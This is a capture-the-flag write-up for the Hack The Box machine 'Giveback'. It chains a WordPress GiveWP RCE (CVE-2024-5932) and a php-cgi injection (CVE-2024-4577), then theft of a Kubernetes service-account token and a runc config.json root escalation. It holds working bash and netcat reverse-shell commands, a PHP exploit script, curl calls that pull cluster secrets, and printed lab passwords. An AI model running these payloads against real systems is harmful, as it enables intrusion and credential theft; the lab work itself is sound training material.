@@ -1,0 +1,296 @@
+---
+title: HTB-Giveback
+published: 2025-12-24
+toc: true
+draft: false
+tags:
+  - "CVE-2024-5932"
+  - "CVE-2024-4577"
+  - "Kubernetes"
+---
+
+```
+Scope:
+10.10.11.94
+```
+
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn -T5 -vvvv giveback.htb
+
+PORT      STATE    SERVICE      REASON      VERSION
+22/tcp    open     ssh          syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http         syn-ack     nginx 1.28.0
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.28.0
+|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
+|_http-generator: WordPress 6.8.1
+30686/tcp open     http         syn-ack     Golang net/http server
+|_http-favicon: Unknown favicon MD5: 078C07D5669A42740EF813D5300EBA4D
+|_http-title: Site doesn't have a title (application/json).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Load-Balancing-Endpoint-Weight: 1
+|     Date: Wed, 24 Dec 2025 11:40:52 GMT
+|     Content-Length: 127
+|     "service": {
+|     "namespace": "default",
+|     "name": "wp-nginx-service"
+|     "localEndpoints": 1,
+|     "serviceProxyHealthy": true
+|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Load-Balancing-Endpoint-Weight: 1
+|     Date: Wed, 24 Dec 2025 11:40:37 GMT
+|     Content-Length: 127
+|     "service": {
+|     "namespace": "default",
+|     "name": "wp-nginx-service"
+|     "localEndpoints": 1,
+|_    "serviceProxyHealthy": true
+```
+
+## wpscan
+
+I noticed that port `80` was running on **WordPress** so I ran a `wpscan` right away:
+
+![](attachments/fe9563532e19b4d38fcf8b33b6d50774.png)
+
+Here I found an outdated plugin:
+
+![](attachments/532a1952013cb5e7379b4223b418044b.png)
+
+Looking around on the internet I find publicly available PoC's for this version:
+
+![](attachments/a2148b28254ca92778e3ad1481c6d3d8.png)
+
+# Exploitation
+## CVE-2024-5932
+
+I went ahead and cloned the repo:
+
+```bash
+git clone https://github.com/EQSTLab/CVE-2024-5932.git
+cd CVE-2024-5932
+```
+
+In order to run the exploit we'll need a valid URL which leads to the **Donation** functionality:
+
+```bash
+python CVE-2024-5932-rce.py -u <URL_TO_EXPLOIT(Donation Form URL)> -c <COMMAND_TO_EXECUTE>
+```
+
+![](attachments/73f8fdc37656639b703f585a1184b1d6.png)
+
+I then used the above URL in combination with a reverse shell command:
+
+```bash
+python3 CVE-2024-5932-rce.py -u 'http://giveback.htb/donations/the-things-we-need/' -c "bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'"
+```
+
+![](attachments/9e25995eb2e402412599aa98fb04fb64.png)
+
+This returned a callback on my listener:
+
+![](attachments/4bc4d39975bc3c0e2c0817f25e5a6e0d.png)
+
+It seems we got a shell as *root* judging from the output of the `id` command? However on closer inspection it just appears that we've landed inside a container instead.
+
+![](attachments/4a2a2b1cfd7d2ecb9d4ff1b78f8fc28e.png)
+
+## Container Priv Esc
+### env enumeration 
+
+I enumerated the environment variables in order to find out more about the target and found some interesting stuff:
+
+![](attachments/65300dd4a37987ac99758f52bd55a5de.png)
+
+```
+sW5sp4spa3u7RLyetrekE4oS
+```
+
+![](attachments/6f073ea977623069f6035c0ee6080acb.png)
+
+```
+O8F7KR5zGi
+```
+
+Further down I found the following:
+
+![](attachments/2dce836d033989952e5a08b0f148352f.png)
+
+This appears to be some sort of legacy service on port `5000`. Since it's in the `env` variables we should be able to reach it using the following command:
+
+```bash
+php -r "echo file_get_contents('http://10.43.2.241:5000/');"
+```
+
+![](attachments/ad1d00cff1ba775e09d00a35b0790dcb.png)
+
+## CVE-2024-4577
+
+Apparently there's a CVE for this exact vulnerability:
+
+![](attachments/026db7e3f147241c41c9870a8e265d78.png)
+
+For this we can set up the following script to exploit this:
+
+```php
+<?php
+// Reverse shell payload (same as the one-liner)
+$payload = 'rm /tmp/shell;mkfifo /tmp/shell;cat /tmp/shell|sh -i 2>&1|nc 10.10.14.9 4444 > /tmp/shell';
+
+// Target URL
+$url = 'http://legacy-intranet-service:5000/cgi-bin/php-cgi?--define+allow_url_include=on+--define+auto_prepend_file=php://input';
+
+// HTTP context
+$options = [
+    'http' => [
+        'method'  => 'POST',
+        'header'  => "Content-Type: application/x-www-form-urlencoded",
+        'content' => $payload,
+        'timeout' => 4
+    ]
+];
+
+$context = stream_context_create($options);
+
+// Send request
+$response = @file_get_contents($url, false, $context);
+
+// Output handling (same behavior as original)
+if ($response !== false) {
+    echo substr($response, 0, 5000);
+}
+?>
+```
+
+![](attachments/c8262a49160991980f408fb3037c695a.png)
+
+Once the script fired I could switch over to my other session where it appears I got *root* access:
+
+![](attachments/cdb7c9262b755216e79a89076af10e2b.png)
+
+## Kubernetes Cluster Enumeration
+
+We can start off by checking out the following directory:
+
+![](attachments/3dda5ef7029fc83838949e43313f8a80.png)
+
+Accordingly we can set the `token` as a new variable:
+
+```bash
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+```
+
+Once done we will be using this token to enumerate the api.
+
+```bash
+curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/secrets
+```
+
+This gives us an absolutely *ENORMOUS* output but the most important is the following:
+
+![](attachments/22977650a9a3154dcc084eed02216f27.png)
+
+![](attachments/eeb7d64a13c456e28e73318bd798d773.png)
+
+# Foothold
+## Shell as babywyrm
+
+```
+babywyrm
+Qoq0jm4sCx8f7D2yysg7f4DJPwKeuH9
+```
+
+After `base64` decoding the password we can go ahead and log in with these credentials:
+
+![](attachments/d70a50e9d6aa8bc6a58ad12ac5952521.png)
+
+### user.txt
+
+![](attachments/3a73bf2b085abe45bdc6e0e82fe39444.png)
+
+# Privilege Escalation
+## debug
+
+I checked out my `sudo` privileges and found the following:
+
+![](attachments/afa80004657c18cf512ac04e1d2f5b0b.png)
+
+In order to run this binary we'll need 2 passwords: 
+
+1. *babywyrm* ssh pass
+2. mariadb admin pass (from `env`)
+
+```bash
+# babywyrm pass
+Qoq0jm4sCx8f7D2yysg7f4DJPwKeuH9
+
+# mariadb pass
+sW5sp4spa3u7RLyetrekE4oS
+```
+
+![](attachments/a32fc998918433a4c858da41ae30c29f.png)
+
+I then tried out the `run` command and noticed the following:
+
+![](attachments/da443254216d61bd5adb7294681312c8.png)
+
+It seems the `config.json` file is missing, which might be a prime opportunity to write one ourselves.
+
+```bash
+{
+    "ociVersion": "1.0.0",
+    "process": {
+        "terminal": false,
+        "user": {"uid": 0, "gid": 0},
+        "args": ["/bin/bash", "-i"],
+        "cwd": "/",
+        "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]
+    },
+    "root": {"path": "/"},
+    "linux": {
+        "namespaces": [
+            {"type": "pid"},
+            {"type": "network"}
+        ]
+    }
+}
+```
+
+Next we create the `rootfs` directory inside the `/tmp` directory:
+
+```bash
+mkdir rootfs
+```
+
+Now we go ahead and run it to instantly get an interactive shell:
+
+![](attachments/7640581b03f89d63efb4c7126882f66a.png)
+
+### root.txt
+
+![](attachments/95addd273d2464e1769405106cc1ce8e.png)
+
+![](attachments/31a9a218a357252777eb456e51d2cb40.png)
+
+---
